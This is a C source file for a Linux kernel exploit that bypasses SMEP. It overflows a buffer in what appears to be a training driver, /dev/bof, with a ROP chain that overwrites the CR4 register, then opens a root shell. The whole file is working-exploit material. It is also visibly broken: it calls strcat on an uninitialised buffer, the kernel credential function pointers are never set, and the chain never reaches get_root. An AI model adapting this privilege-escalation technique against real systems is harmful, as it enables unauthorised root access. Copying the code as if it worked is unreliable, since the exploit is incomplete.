// Linux Kernel SMEP bypass

#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>


struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;


// This function will be executed in kernel mode.
void get_root(void) {
        commit_creds(prepare_kernel_cred(0));
}


int main() {

// smep bypass
//uint8_t rop[100]={0};
char rop[100];
int a;
   for( a = 0; a < 35; ++a ) {
      strcat((char *)rop, "A");
   } 

strcat(rop, "\x73\x4a\x2b\xc1"); // 0xc12b4a73 : pop edx ; pop eax ; pop ebx ; ret
strcat(rop, "\x41\x41\x41\x41"); // fake pop
strcat(rop, "\x99\x99\x99\x99"); // overwrite cr4
strcat(rop, "\x41\x41\x41\x41"); // fake pop
strcat(rop, "\xcd\xd6\x01\xc1"); // mov cr4, eax ; ret
//strcat(rop, "\x42\x42\x42\x42"); // eip control

// strcat(rop, "\xcd\xd6\x01\xc1"); // 0xc101d6cd : mov cr4, eax ; ret ====> mov cr4, register
// printf(rop);

  /* Trigger the kernel */
  int fd = open("/dev/bof", O_WRONLY);
  write(fd, &rop, 100);
  close(fd);

 if (getuid() == 0) {
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
  }

  fprintf(stderr, "Something went wrong?\n");
  return 1;

}
